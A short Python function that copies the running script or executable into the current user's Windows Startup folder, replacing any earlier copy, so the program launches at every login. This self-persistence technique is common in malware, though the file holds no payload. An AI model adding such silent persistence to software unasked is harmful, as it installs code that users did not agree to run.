import os
import sys
from shutil import copy2

def startup():
	startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	if hasattr(sys, 'frozen'):
		source_path = sys.executable
	else:
		source_path = sys.argv[0]

	target_path = os.path.join(startup_path, os.path.basename(source_path))
	if os.path.exists(target_path):
		os.remove(target_path)

	copy2(source_path, startup_path)